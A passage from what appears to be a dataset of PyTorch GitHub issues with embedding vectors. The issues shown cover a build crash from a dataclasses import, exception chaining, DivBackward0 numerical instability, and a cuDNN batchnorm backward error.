  8.03644136e-02  5.04007101e-01  1.21780820e-01  3.46591994e-02
 -1.80285349e-01  2.05421984e-01  1.43131852e-01  4.63600755e-02
  1.40377536e-01  8.09717923e-02 -2.81075150e-01 -3.20847988e-01
  3.40150446e-02 -8.96366313e-03 -3.08268107e-02 -4.75817360e-02
  6.06819913e-02 -2.77340591e-01  4.55445647e-02  1.47342503e-01
 -1.79034486e-01  1.80929914e-01  2.83918530e-01 -2.00770527e-01
  2.72102237e-01 -1.48391992e-01 -1.59261763e-01 -4.35075819e-01
  1.56517159e-02 -4.91100289e-02 -2.03997612e-01  7.27382209e-03
 -8.84190649e-02 -1.64058208e-01 -5.37452847e-02  5.05376607e-02
  8.59928727e-02  3.64305917e-03  9.38836858e-02  2.61099100e-01
 -8.59920084e-02 -5.53531572e-03  1.94006890e-01 -2.27776021e-01
  3.19695145e-01  3.28694046e-01 -2.13969067e-01 -7.99182355e-02
 -1.88990027e-01 -3.46725341e-03  1.05134055e-01 -2.79562235e-01
  1.65199518e-01 -4.26086895e-02  1.27535045e-01  2.41874412e-01
 -1.49519116e-01  1.75683767e-01  2.23390400e-01  2.00274825e-01
 -2.29261860e-01  7.95970708e-02  8.02075043e-02 -9.77265276e-03
  1.97256178e-01 -1.14316300e-01 -1.38337031e-01 -2.16560006e-01
 -5.26819229e-01  1.03334695e-01 -2.74596252e-02 -3.13034952e-01
  3.95879775e-01  8.77585858e-02  2.53516376e-01  5.00902295e-01
  5.33618778e-02  3.40743661e-02 -1.25467166e-01  1.80990025e-02
 -4.40238453e-02  1.20994151e-01  1.72328204e-03  2.18582209e-02
  1.01438396e-01  5.27281091e-02  3.27292681e-02  3.12372148e-01
  1.18908867e-01 -2.04571962e-01  8.19890648e-02 -3.27561975e-01
  2.61484921e-01 -2.79390275e-01  3.55821967e-01 -2.62326032e-01
  2.09573492e-01 -1.30762696e-01 -2.26268232e-01 -1.86743334e-01
 -6.50611892e-02 -2.51737475e-01 -3.81063640e-01 -3.22028995e-02
  4.94421005e-01  8.79063457e-02 -1.59589052e-01 -1.08255297e-01
 -1.10247284e-01 -1.56774461e-01 -2.11589530e-01 -1.38560869e-02
  4.59831864e-01 -1.06568113e-01 -2.33376130e-01 -7.60075748e-02
 -2.54995853e-01 -1.41500354e-01  3.25225256e-02  6.68742508e-02
 -1.24691598e-01 -9.62137133e-02  8.30781758e-02 -9.03525352e-02
 -1.69734418e-01  1.73479378e-01  2.05183566e-01 -1.47895083e-01
  1.91902220e-01 -2.39281341e-01  1.95544958e-01  2.51765490e-01
 -2.18190640e-01  3.82089883e-01  3.23943943e-02  2.02004313e-01
  1.13108069e-01  5.10696352e-01  1.87022001e-01  1.71693251e-01
 -4.90205884e-01 -4.00393903e-01 -2.53837466e-01  5.31101748e-02
  1.43275157e-01  1.30158886e-01 -2.55785048e-01  3.97555828e-02
  5.29777743e-02 -6.96137175e-02 -1.45863414e-01 -1.73326749e-02
 -1.65102303e-01 -1.47856012e-01  8.28362256e-03 -2.75051910e-02
 -2.32338935e-01  1.24465004e-01  1.43101543e-01 -4.37508933e-02
 -1.50117069e-01 -2.03426629e-01 -3.07884097e-01 -2.10430115e-01
 -2.00735182e-01 -1.55175805e-01  1.45421386e-01  2.83126503e-01
 -6.80920184e-02  1.27902953e-03  1.53612182e-01  1.74445599e-01
 -1.88070327e-01  2.31174946e-01  1.25181135e-02  1.24234274e-01
  1.70707971e-01  1.74449563e-01 -1.11843467e-01  5.03740460e-02
 -3.89770567e-01  2.91639939e-04 -2.94038743e-01 -1.73597291e-01
  8.65611732e-02 -1.71245858e-01 -2.40749642e-02 -8.49213637e-03
  2.45355949e-01  1.14487067e-01 -3.34133089e-01 -1.17277294e-01
 -1.74024746e-01  2.90312111e-01  2.44256169e-01  2.38844335e-01
  3.07530671e-01 -2.78443664e-01  1.97316304e-01 -1.72893524e-01
 -1.60269246e-01  1.97361529e-01  1.62547335e-01  2.38323256e-01]"
Breakage caused by #42629 triaged,"## ðŸ› Bug

[this line](https://github.com/pytorch/pytorch/blob/master/tools/codegen/model.py#L3) is causing a crash when we try to build pytorch.

Crash looks like this:
```
Step #0: [91mTraceback (most recent call last):
Step #0:   File ""/root/anaconda3/envs/pytorch/lib/python3.6/runpy.py"", line 193, in _run_module_as_main
Step #0:     ""__main__"", mod_spec)
Step #0:   File ""/root/anaconda3/envs/pytorch/lib/python3.6/runpy.py"", line 85, in _run_code
Step #0:     exec(code, run_globals)
Step #0:   File ""/pytorch/tools/codegen/gen.py"", line 14, in <module>
Step #0:     from tools.codegen.model import *
Step #0:   File ""/pytorch/tools/codegen/model.py"", line 3, in <module>
Step #0:     from dataclasses import dataclass
Step #0: ModuleNotFoundError: No module named 'dataclasses'
```

(all times in US/West)
Our 7AM, 8AM builds and earlier were all fine but 9AM, 10AM, 11AM builds all crashed with that same traceback.

The new import was added in https://github.com/pytorch/pytorch/pull/42629/files which I think went in between 8AM and 9AM today

## To Reproduce

See command below:
`Step #0: subprocess.CalledProcessError: Command '['cmake', '-DBUILD_PYTHON=True', '-DBUILD_TEST=True', '-DCMAKE_BUILD_TYPE=Release', '-DCMAKE_INSTALL_PREFIX=/pytorch/torch', '-DCMAKE_PREFIX_PATH=/../', '-DNUMPY_INCLUDE_DIR=/root/anaconda3/envs/pytorch/lib/python3.6/site-packages/numpy/core/include', '-DPYTHON_EXECUTABLE=/root/anaconda3/envs/pytorch/bin/python', '-DPYTHON_INCLUDE_DIR=/root/anaconda3/envs/pytorch/include/python3.6m', '-DPYTHON_LIBRARY=/root/anaconda3/envs/pytorch/lib/libpython3.6m.so.1.0', '-DTORCH_BUILD_VERSION=1.7.0a0+6ea8916', '-DUSE_CUDA=0', '-DUSE_NUMPY=True', '/pytorch']' returned non-zero exit status 1.`

`Step #0: The command '/bin/sh -c cd /pytorch && bash xla/scripts/build_torch_wheels.sh ${python_version} ${release_version}' returned a non-zero code: 1`

See here if needed for `build_torch_wheels.sh`: https://github.com/pytorch/xla/blob/master/scripts/build_torch_wheels.sh

## Expected behavior

<!-- A clear and concise description of what you expected to happen. -->

## Environment

Please copy and paste the output from our
[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)
(or fill out the checklist below manually).

You can get the script and run it with:
```
wget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py
# For security purposes, please check the contents of collect_env.py before running it.
python collect_env.py
```

 - PyTorch Version (e.g., 1.0): building from master
 - OS (e.g., Linux): linux
 - How you installed PyTorch (`conda`, `pip`, source): source
 - Build command you used (if compiling from source): see above under 'reproduce'
 - Python version: 3.6
",True,"[-2.04802871e-01 -4.42881167e-01 -1.22944117e-01  4.67548594e-02
  9.71656740e-02 -3.18425387e-01 -1.15717605e-01  2.57713348e-01
 -2.40399331e-01 -1.98951438e-01 -2.21767783e-01  1.87155195e-02
 -1.87749177e-01 -8.74977931e-02 -2.33585566e-01  1.65152222e-01
 -3.17302942e-01 -4.67255324e-01  2.25077942e-02  1.90131292e-02
 -1.35679450e-02  1.14816055e-01 -1.54984683e-01  8.02793652e-02
 -2.85575449e-01  1.90427288e-01  1.30219027e-01 -8.21514428e-02
 -1.47736102e-01 -6.15430437e-03  4.80274782e-02  2.90654361e-01
  1.09750889e-01 -8.15826803e-02  4.68396693e-01  4.85855341e-02
 -2.50358164e-01 -4.90429431e-01  3.48023288e-02 -1.29405633e-01
  1.68435723e-02  1.22292116e-01 -1.66204333e-01 -7.81046450e-02
 -1.31119519e-01 -3.54161449e-02 -6.67243153e-02  6.55361414e-02
 -7.21689090e-02 -2.91436911e-02 -3.03008780e-03  3.43547702e-01
 -5.16165234e-02 -2.71361530e-01  9.09432247e-02 -2.38586247e-01
  2.27298122e-02  2.34621137e-01  1.84073329e-01  4.19849277e-01
  2.10436881e-01  3.26181799e-02 -7.35738128e-02  1.50605980e-02
  1.77115843e-01  3.21739197e-01  1.35606259e-01 -2.75922567e-01
  1.39319956e-01  1.19915484e-02  8.35632160e-03 -1.68931991e-01
 -4.30815369e-01 -3.47061396e-01  1.20012999e-01  6.42063469e-02
 -2.22791180e-01 -1.01867959e-01 -8.43772814e-02 -1.81740433e-01
 -9.65010300e-02 -1.45565242e-01  2.46144295e-01 -1.41106680e-01
  1.61874834e-02 -1.73645556e-01  2.22225040e-01  1.20355403e-02
  3.57933074e-01  7.31044784e-02  2.77411461e-01  6.89668432e-02
  1.70840681e-01  4.82190818e-01  5.47632128e-02  2.23951519e-01
 -1.66261047e-01 -1.39877528e-01 -8.13008696e-02 -2.06011266e-01
 -6.22319803e-03 -1.93635255e-01 -1.32149771e-01  3.86267990e-01
 -1.22398943e-01  8.69269893e-02  4.16221797e-01  4.55872566e-01
  4.41826344e-01 -1.21370986e-01  1.09447345e-01  8.54474381e-02
  1.01534486e-01  2.85244614e-01  8.14545229e-02  1.66854888e-01
  2.28966549e-02 -4.58168313e-02 -3.54652017e-01  2.88400799e-01
  1.37968928e-01 -1.69225171e-01 -1.24426767e-01  2.26905808e-01
  8.90054032e-02  1.52493492e-02 -2.39936724e-01  1.38753176e-01
  1.85015112e-01 -2.44425535e-01  7.75530040e-02  1.01037823e-01
 -1.41492978e-01  1.13830175e-02 -1.08693093e-01  1.28271669e-01
 -2.55656153e-01 -5.16684055e-02  1.44579843e-01 -1.50653124e-01
 -1.50777951e-01 -2.80469090e-01  4.58976962e-02 -3.45832407e-01
 -1.74008384e-01  1.18774921e-01 -3.72149110e-01  3.80963355e-01
 -5.69615997e-02 -2.24476695e-01  1.66140739e-02  1.04006715e-02
 -1.69434518e-01  9.81477618e-01 -5.25600053e-02 -1.54697541e-02
  3.27341676e-01  2.31524091e-02  7.63695464e-02 -3.05622578e-01
 -2.09966600e-01  1.88030958e-01 -2.69250274e-01 -7.28413016e-02
  9.86513421e-02  3.09443511e-02 -6.43216014e-01 -2.19956413e-01
 -1.73771441e-01 -1.77559301e-01 -2.05705807e-01  1.09557986e-01
  1.93187937e-01 -6.51447415e-01  9.27282721e-02  2.68514484e-01
 -1.78737044e-01  1.62192822e-01 -1.88810661e-01  4.60784435e-01
  1.87780559e-01  2.71673709e-01 -1.44392848e-01  1.96968272e-01
  1.18541047e-01 -1.56251356e-01  5.62165827e-02 -4.44666222e-02
  2.27841794e-01 -7.45508000e-02 -1.63275197e-01  1.05957575e-02
  2.85715997e-01 -2.12587431e-01  8.38229507e-02  1.00850046e-01
 -2.34117717e-01  3.71197850e-01  5.31311184e-02 -9.25022736e-03
  7.68494084e-02  9.15590376e-02 -1.14040725e-01 -1.02899328e-01
  8.57193768e-03  1.32528365e-01 -4.16726053e-01 -2.80672014e-01
  2.44994789e-01 -1.28443778e-01 -2.48827234e-01 -5.75935245e-01
 -2.12512389e-01 -2.52798218e-02 -2.63502866e-01 -4.71700355e-02
  1.59854978e-01  1.12169631e-01  1.08701102e-01  1.77569956e-01
  7.14508444e-02  4.51600626e-02 -1.31096065e-01 -2.77161717e-01
  2.05462039e-01 -5.03136255e-02 -1.06075369e-02 -2.23826915e-02
  2.29967475e-01 -9.47566926e-02 -2.62789607e-01  6.21717349e-02
  1.76273525e-01  2.99023598e-01  2.41224483e-01  1.73859492e-01
 -1.07343629e-01 -5.74746244e-02  6.50036409e-02  1.82898089e-01
  4.89730150e-01 -9.29490849e-02 -7.80585408e-02 -3.24982107e-01
 -1.57208182e-03  1.20555624e-01 -1.12913795e-01 -1.27899289e-01
 -1.89029098e-01  2.67457724e-01 -1.17135897e-01 -6.33486062e-02
  1.93489939e-01  2.31978312e-01  1.83329955e-01  1.03378564e-01
  2.47130975e-01 -1.68879814e-02  3.58232498e-01  2.02883873e-02
 -1.03172749e-01  8.15722644e-02 -2.32898757e-01 -1.28282815e-01
  5.68707809e-02  4.22048151e-01 -2.70451427e-01  9.09963399e-02
 -5.02389483e-02  1.65343806e-02  2.74872541e-01 -2.35269636e-01
  2.84936279e-01  2.40868449e-01  4.00662571e-01 -1.04997076e-01
  5.57860613e-01 -8.36675167e-02 -1.63073353e-02  3.86985727e-02
  1.26951590e-01  2.08539188e-01 -8.84949118e-02  1.83501214e-01
  4.23231125e-01  2.21097231e-01  5.70867248e-02 -3.12962234e-01
 -2.38720492e-01 -1.62716359e-01 -3.72393042e-01  4.29236665e-02
  6.38738930e-01  2.89817214e-01 -1.15505904e-01  3.71863037e-01
 -1.29544213e-01  3.89534026e-01  1.09990776e-01 -1.09811211e-02
 -4.98165578e-01 -2.16118544e-01 -1.04548387e-01 -1.06618896e-01
 -8.50016028e-02  4.83188368e-02 -4.04748507e-02  1.96964115e-01
  1.98875993e-01 -5.99630773e-01 -3.75493653e-02  5.21226227e-01
 -1.83611393e-01  3.52531374e-01 -3.11604649e-01  7.00322092e-02
 -1.78929001e-01  6.20479941e-01  1.06245548e-01 -1.54074188e-02
 -1.24786161e-01 -2.36037523e-01 -3.92124325e-01  2.24751934e-01
  3.94881904e-01  4.01099473e-02 -2.38184005e-01 -8.60353559e-03
 -3.50601882e-01  1.57059785e-02  8.66340823e-04  5.74204698e-02
 -1.00473929e-02  1.32436603e-01 -2.37539679e-01 -1.35312751e-02
 -3.19217145e-01  9.51058045e-02  1.85545608e-01 -2.37268612e-01
 -6.06800392e-02 -4.34281468e-01  2.04818144e-01 -2.07309723e-01
 -1.04680069e-01 -2.06583619e-01  2.18108773e-01  2.82730341e-01
 -1.44965649e-01 -1.91704676e-01  2.67221570e-01  9.33612883e-02
 -1.27017006e-01  1.71290506e-02 -2.60503829e-01  3.17885071e-01
 -1.49388433e-01  4.74642634e-01  2.58361399e-01  1.93170562e-01
 -4.73226547e-01 -4.20476645e-02 -3.90931636e-01  7.40702450e-02
  3.91822308e-03 -1.00786105e-01 -3.48110735e-01  1.73528448e-01
  7.59428740e-02 -4.80900742e-02 -8.89449269e-02  9.36615467e-02
 -1.48234546e-01  1.70598611e-01  2.90842146e-01 -1.46505862e-01
  2.52476573e-01  2.28248626e-01 -1.37344785e-02 -2.00403929e-01
 -1.76797494e-01  1.21288136e-01  2.06114382e-01 -3.20844173e-01]"
Fix exception chaining all over the codebase triaged better-engineering,"I would like to suggest a small fix in the way that Python 3's exception chaining is used.

As described in detail in [this article](https://blog.ram.rachum.com/post/621791438475296768/improving-python-exception-chaining-with), exception chaining ([PEP 3134](https://www.python.org/dev/peps/pep-3134/)) can be used to make exceptions more user-friendly, and in that case, the syntax `raise new_exception from old_exception` needs to be used.

For example, the following should be used to chain exceptions:
```python
try:
    something_which_raises_TypeError
except TypeError as e:
    raise ValueError(""A more user-friendly exception message."") from e
```
instead of:
```python
try:
    something_which_raises_TypeError
except TypeError:
    raise ValueError(""A more user-friendly exception message."")
```

One example which needs to be fixed is:
https://github.com/pytorch/pytorch/blob/c7787f7fbf388f9fe326d581726e7ef3f2dce74b/torch/jit/annotations.py#L32-L35

I'd be happy to PR! Let me know your thoughts on this!",True,"[-0.08536627 -0.4209569  -0.1995692  -0.4675836   0.1379942  -0.04363327
 -0.00519758  0.124561   -0.47018203 -0.13796762  0.01901302  0.32949492
  0.39133817  0.08216706 -0.3620001   0.33803034 -0.24153614 -0.05249458
 -0.06285023  0.0065773  -0.3614927  -0.03197442 -0.3240738   0.1996473
 -0.16895287 -0.06106553 -0.10509408  0.00590795 -0.24404104  0.16626118
  0.29147163  0.3373256  -0.12819183  0.08280741 -0.08141875  0.0453588
 -0.5103706  -0.36347097 -0.04429923  0.01378228 -0.14026356  0.08276309
 -0.19063163 -0.16341947 -0.3933394  -0.06644011 -0.25286004  0.4958043
 -0.11197121 -0.04585873  0.12376125  0.3799799  -0.04387982 -0.27997452
 -0.06008141 -0.1804188   0.03388024  0.20873916 -0.00552547  0.39053893
  0.5700345   0.07078815  0.30852538 -0.04577341 -0.02014726  0.29770407
  0.15607876  0.06761631  0.29302335  0.24853435  0.27154163 -0.28677532
 -0.6005415  -0.0892804  -0.07397348  0.04162498 -0.23259127 -0.13334697
 -0.1306926  -0.19565243 -0.45696247 -0.07236861  0.12823448 -0.1475269
  0.16466846 -0.2626451   0.07517991 -0.26706     0.33142498  0.02525805
  0.2664514  -0.12123707  0.39481717  0.15273118  0.09310959  0.24478349
  0.13085724  0.0222976  -0.20663252  0.08418342  0.31664258 -0.1600602
 -0.25606367 -0.20841712  0.22218621 -0.0430408   0.42638156 -0.16939662
 -0.12671599  0.20092084  0.19566694  0.18479079  0.35332566 -0.11296742
 -0.00865225  0.26811147  0.03385892 -0.04892163  0.20503561  0.05891414
  0.05101572 -0.01017334  0.21380745  0.10521451  0.14685485  0.19215308
 -0.1774745  -0.10927354 -0.20009997 -0.16825153  0.09820204 -0.1632674
 -0.0464531   0.09211312 -0.28507894  0.20534721  0.03069181 -0.05451445
 -0.16676423 -0.6256576  -0.17205593 -0.2424247   0.24534105 -0.40381125
  0.1158167  -0.05445696 -0.16765417  0.38329324 -0.17041382 -0.32483706
  0.2418243   0.07514358 -0.32494783  0.453878    0.22051758  0.07746587
  0.62182164 -0.05205563  0.22889066 -0.2640487  -0.16992988  0.31309587
  0.05286021 -0.08100403 -0.20071992  0.20584601 -0.51824784 -0.04202731
 -0.20288041 -0.00606902  0.00893673 -0.26833272  0.17546296  0.07906864
 -0.2793603  -0.1357672  -0.20297663 -0.08798841  0.45822984  0.0686968
  0.12374746  0.03067652 -0.00492779  0.03321874 -0.16164415  0.14390051
  0.04309244  0.12133956  0.16533148 -0.29744226 -0.31127062 -0.15918967
  0.3729337  -0.06563511  0.11191922 -0.10702159  0.20374984  0.19475356
  0.3091895   0.39409274 -0.18805072  0.410353   -0.15010715 -0.28041187
  0.10866606  0.15773897  0.15522371 -0.56913054  0.12949795 -0.03151022
  0.08566139  0.04410553  0.08088494 -0.4975481  -0.29576945 -0.1401103
 -0.00230641  0.18142322  0.29619902 -0.04191837  0.01959839  0.08892326
  0.2685075  -0.30266318  0.04248805 -0.05469828 -0.05941502 -0.36135188
 -0.07966406  0.04785997 -0.27742496  0.02696651 -0.02802117 -0.24879357
 -0.08083881 -0.11508422  0.08697961 -0.0098558   0.0988677   0.12167672
  0.3256015  -0.12044476 -0.02648842  0.06202465  0.5316297   0.08720316
  0.05935975  0.11155075 -0.10902168  0.0136092  -0.09366512 -0.1628891
  0.42610615 -0.00770865  0.38469687  0.42176086  0.07611271  0.02240278
 -0.11278363 -0.27756622  0.2642209   0.3259614  -0.20148551 -0.02434151
  0.2797148   0.13948968 -0.0369566   0.05372675  0.24378477  0.03191191
  0.08374804  0.11745337 -0.01413211  0.01974114  0.02928465 -0.03714079
  0.40055227 -0.30178967  0.08482619  0.02790285 -0.06277385 -0.18799086
 -0.03320349  0.07561912 -0.22234932 -0.08089045  0.24959227 -0.02985827
 -0.2930907   0.23902613 -0.51016766  0.12646873 -0.02019439 -0.15731317
 -0.04905971  0.24117698 -0.2151336  -0.2394622   0.04602943 -0.1665873
 -0.20343238 -0.04008984 -0.04214398 -0.04003523  0.04047178 -0.18555036
  0.03787299  0.16676117  0.17086798 -0.20061386  0.05898702 -0.01183356
 -0.10999277  0.50955725 -0.13936588 -0.01790262 -0.20676889  0.4464413
  0.30314517 -0.08076929 -0.18240476 -0.0370404  -0.19382259 -0.16489843
  0.27376243  0.4378491  -0.60801804  0.07472761 -0.22519404 -0.25942078
 -0.0377822   0.3443988  -0.2387669   0.09581343 -0.11198749  0.11842566
 -0.07881927  0.03527066  0.1569123   0.33554226  0.29873496  0.10733176
  0.09964854 -0.34435028 -0.3616952  -0.3250992   0.20185487  0.52974075
  0.17939934 -0.33602536  0.24488443 -0.10034339 -0.05165517  0.08027893
 -0.2719676   0.10671045 -0.21555305 -0.03647923  0.12019766 -0.09776334
 -0.29835993  0.00522555 -0.538556   -0.05984677  0.15762132 -0.28945363
 -0.30823025 -0.00134714  0.42163903  0.02924827 -0.40013975  0.26082456
  0.27172232  0.36633953  0.37593317 -0.13639063  0.3846531  -0.1271865
 -0.03040575 -0.09240089  0.03457885 -0.08546282  0.12249552  0.32269764]"
Numerical instability in DivBackward0 for multiple backward module: numerical-stability module: autograd triaged,"## ðŸ› Bug

A simple division operation: `g = x/y` could produce numerical instability if multiple backward is applied.
This is because the derivative is calculated by `-grad * self / (other * other)` (see `tools/autograd/derivatives.yaml` in `div.Tensor`).
The `other` tensor is squared in one backward operation, so multiple operation will raise `other` to the power of `2^n` and can reach `inf` or `0` very quickly.
A simple fix should be sufficient: by replacing the derivative calculation to `-grad * result / other`, but it makes a bunch of tests fail (I'm not sure why).

## To see the problem

    import torch

    class Div2(torch.autograd.Function):
        @staticmethod
        def forward(ctx, x, y):
            z = x / y
            ctx.save_for_backward(x, y, z)
            return z

        @staticmethod
        def backward(ctx, gz):
            x, y, z = ctx.saved_tensors
            gx = Div2.apply(gz, y)
            gy = Div2.apply(-gz*z, y)
            return gx, gy

    def example(g, y, n):
        gs = [g.item()]
        for i in range(n):
            g, = torch.autograd.grad(g, (y,), create_graph=True)
            gs.append(g.item())
        return gs

    if __name__ == ""__main__"":
        a = 1e-8
        x = torch.tensor(a, requires_grad=True)
        y = torch.tensor(a, requires_grad=True)
        n = 4
        factorial = lambda i: 1 if i < 2 else i * factorial(i-1)
        print(""Div1 (current implementation):"")
        print(example(x / y, y, n))
        print(""Div2 (proposed implementation):"")
        print(example(Div2.apply(x, y), y, n))
        print(""Actual:"")
        actual = [(-1)**i*factorial(i)/(a**i) for i in range(n+1)] # [1.0, -1/a, 2/(a*a), -3*2/(a*a*a), 4*3*2/(a**4)]
        print(actual)

Output: 

    Div1 (current implementation):
    [1.0, -100000000.0, 1.99999983976448e+16, -inf, nan]
    Div2 (proposed implementation):
    [1.0, -100000000.0, 2.000000054512845e+16, -6.000000083090567e+24, 2.4000002343777533e+33]
    Actual:
    [1.0, -100000000.0, 1.9999999999999996e+16, -5.999999999999999e+24, 2.4e+33]

The current implementation of `DivBackward0` could not calculate the results correctly even with `1e-8` for triple backward, even though the actual result still within the `float32` range.

## Expected behavior

See above.

## Environment

 - PyTorch Version (e.g., 1.0): PyTorch 1.6.0
 - OS (e.g., Linux): Ubuntu
 - How you installed PyTorch (`conda`, `pip`, source): `conda`
 - Build command you used (if compiling from source): N/A
 - Python version: 3.8
 - CUDA/cuDNN version: N/A
 - GPU models and configuration: N/A
 - Any other relevant information: N/A

## Additional context

<!-- Add any other context about the problem here. -->


cc @ezyang @SsnL @albanD @zou3519 @gqchen",True,"[-0.23750502 -0.40020174 -0.06709645 -0.1990253  -0.19149283 -0.26621312
  0.22141194  0.15119666 -0.3999294  -0.07402912 -0.04898566  0.40239188
 -0.07960484 -0.01447607 -0.09180199  0.23529893 -0.40328306 -0.21004222
 -0.2872759  -0.01357216  0.00993206 -0.1898684  -0.47315264  0.26428345
 -0.01935353  0.07087456  0.09764357 -0.03108171  0.43632108 -0.16544071
 -0.01376726  0.22733672 -0.08375386 -0.00121551 -0.20406502  0.03223077
 -0.13172366 -0.01994853 -0.00542209  0.15326388 -0.21005575  0.06548277
 -0.02026279 -0.20788184  0.19069996 -0.0579391   0.0315287   0.12074784
 -0.06454805 -0.15158223  0.10541186  0.17504737  0.05018792 -0.28944165
  0.04865241 -0.24365425  0.00636931  0.10758208  0.21921758 -0.31191623
  0.33556843  0.01632206 -0.07395963 -0.04565169  0.05325997  0.02524049
  0.586265    0.07787699  0.05573826  0.7013775   0.3176252  -0.16602588
 -0.42756838 -0.20379883  0.3029928   0.02871563  0.01996368  0.12365339
  0.3197804   0.10280992  0.1636049   0.13358843 -0.1466839  -0.25559634
 -0.19756116 -0.25615475  0.30414852 -0.05744079  0.5813552  -0.07202335
  0.13429362  0.00353161 -0.20905033  0.23798944  0.26923424  0.25999528
  0.08192155 -0.03359092  0.08251171 -0.05740542 -0.10539599 -0.02624487
 -0.08950034  0.13431306 -0.06789888  0.02631514  0.21406215  0.11880119
  0.12944084 -0.06927562  0.1266893  -0.04753175  0.36300862  0.01296538
  0.01929577  0.03099416 -0.12168479  0.11476584 -0.14074276  0.14149365
 -0.25630453 -0.10026611  0.11415219  0.25102627  0.30149633  0.05608908
 -0.16843227 -0.0874785  -0.10473052 -0.14626105  0.20254117  0.10732974
 -0.2328106   0.1308375  -0.0926329  -0.03177694 -0.06671459  0.04912992
 -0.06688885  0.14310475 -0.35539952 -0.16176781 -0.08694682 -0.25713763
  0.08913585 -0.29814696 -0.07691325  0.10886355 -0.0337672  -0.06746557
  0.08829747 -0.14279789 -0.25157052  0.23455453  0.29529345  0.22549647
  0.10172609 -0.01468959  0.01040543 -0.10455137  0.25350922  0.19083187
 -0.19975725  0.11692413  0.10189357  0.2781744  -0.2191254   0.183464
 -0.15936527  0.19747183 -0.08144503  0.1442436  -0.02170908  0.18585873
  0.51504165 -0.20145474 -0.29221368 -0.44987297 -0.28072965  0.4692391
  0.05760088 -0.06381335  0.38736045  0.2149415   0.13489698  0.21102189
  0.13360405 -0.04028204 -0.22647934 -0.00777634 -0.02186507 -0.34907174
 -0.26066628  0.03513698 -0.064795   -0.15907073 -0.01469908 -0.25982764
 -0.01240334 -0.13946526  0.06014067 -0.17436814  0.10043968  0.13007644
  0.11635329 -0.14142528 -0.11006424 -0.26841408 -0.5253844   0.09969307
  0.02647634 -0.15297505  0.18276295 -0.02892084 -0.15409881 -0.17317161
  0.24264334 -0.01966226 -0.03137581  0.0122972   0.25944012  0.32487965
  0.10325158 -0.28242397 -0.2509296  -0.3047674  -0.26503712 -0.22579034
 -0.05205106  0.10331511  0.03945566 -0.02214852 -0.09025109 -0.14757258
  0.36946732 -0.1023235  -0.34739858  0.18950443 -0.15345143 -0.01584706
 -0.2217048   0.0197957  -0.05142047 -0.10679583  0.3874811   0.1901597
 -0.14981027  0.3060255  -0.09181614  0.17254527 -0.25393343  0.09716832
 -0.00467277  0.10097428  0.13257246 -0.04962389  0.53069216  0.2555935
  0.06059283 -0.1066242   0.02728767  0.25455648 -0.02939945  0.14182878
 -0.10470882  0.21933323  0.08146718 -0.1432453   0.2240792   0.1735425
  0.15143424 -0.32770717  0.4877801  -0.09522847  0.14288086 -0.31797603
  0.36924332  0.05735505 -0.12546691 -0.08021227 -0.13057674  0.13419777
 -0.24395725  0.1740972  -0.0695463  -0.30305666  0.2564627   0.0601606
 -0.08804948 -0.04876507 -0.3021875  -0.1440239   0.31856906 -0.02399838
  0.10969738  0.30095792 -0.04039917  0.03975371  0.10194277  0.11839984
  0.16063485 -0.04088398  0.2303807  -0.2154093  -0.2497935  -0.00234571
  0.11184921  0.25617293 -0.08664222 -0.14292875  0.19509754  0.08762536
 -0.1285331   0.25436968  0.05918793  0.08501261  0.0371177   0.3892267
  0.3825013  -0.14980873 -0.0688124  -0.19637433  0.011431   -0.16211797
 -0.08753404  0.09977311 -0.21197098 -0.28890094 -0.15478705  0.03225475
  0.05130159  0.04237796 -0.16671443  0.20377415 -0.00295019 -0.05149885
 -0.6077082   0.3170057  -0.08214476 -0.14330006  0.01039692 -0.0626872
  0.0748617  -0.17484698 -0.15691736 -0.17733636  0.21301469  0.11063287
 -0.192774   -0.03606283 -0.17607096 -0.1665948  -0.19944362  0.06229869
 -0.0796667   0.08435284  0.4319025   0.12164209 -0.18585946  0.5796244
 -0.28754887 -0.01312844 -0.30317473 -0.00214018  0.2623151  -0.18159571
 -0.0514197   0.07365765  0.18392885  0.12058318  0.241148    0.33633256
 -0.32949007  0.00830115  0.43405026 -0.17003942 -0.52941746  0.2846897
 -0.19902034 -0.3139417  -0.10575911  0.22051361  0.24337876 -0.07959318]"
CUDA Error in batchNorm module: cuda triaged,"## ðŸ› Bug

---------------------------------------------------------------------------
RuntimeError                              Traceback (most recent call last)
<ipython-input-93-52a0569421b1> in <module>
----> 1 loss.backward()

/opt/conda/lib/python3.7/site-packages/torch/tensor.py in backward(self, gradient, retain_graph, create_graph)
    183                 products. Defaults to ``False``.
    184         """"""
--> 185         torch.autograd.backward(self, gradient, retain_graph, create_graph)
    186 
    187     def register_hook(self, hook):

/opt/conda/lib/python3.7/site-packages/torch/autograd/__init__.py in backward(tensors, grad_tensors, retain_graph, create_graph, grad_variables)
    125     Variable._execution_engine.run_backward(
    126         tensors, grad_tensors, retain_graph, create_graph,
--> 127         allow_unreachable=True)  # allow_unreachable flag
    128 
    129 

RuntimeError: Expected grad_output->is_contiguous(grad_output->suggest_memory_format()) to be true, but got false.  (Could this error message be improved?  If so, please report an enhancement request to PyTorch.)
Exception raised from cudnn_batch_norm_backward at /opt/conda/conda-bld/pytorch_1595629403081/work/aten/src/ATen/native/cudnn/BatchNorm.cpp:249 (most recent call first):
frame #0: c10::Error::Error(c10::SourceLocation, std::string) + 0x4d (0x7f993197377d in /opt/conda/lib/python3.7/site-packages/torch/lib/libc10.so)
frame #1: at::native::cudnn_batch_norm_backward(at::Tensor const&, at::Tensor const&, at::Tensor const&, at::Tensor const&, at::Tensor const&, at::Tensor const&, at::Tensor const&, double, at::Tensor const&) + 0x25b2 (0x7f9932a79db2 in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_cuda.so)
frame #2: <unknown function> + 0xd1150a (0x7f9932aea50a in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_cuda.so)
frame #3: <unknown function> + 0xd3fa3b (0x7f9932b18a3b in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_cuda.so)
frame #4: at::cudnn_batch_norm_backward(at::Tensor const&, at::Tensor const&, at::Tensor const&, at::Tensor const&, at::Tensor const&, at::Tensor const&, at::Tensor const&, double, at::Tensor const&) + 0x1ef (0x7f9964cff10f in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_cpu.so)
frame #5: <unknown function> + 0x2b59cff (0x7f9966946cff in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_cpu.so)
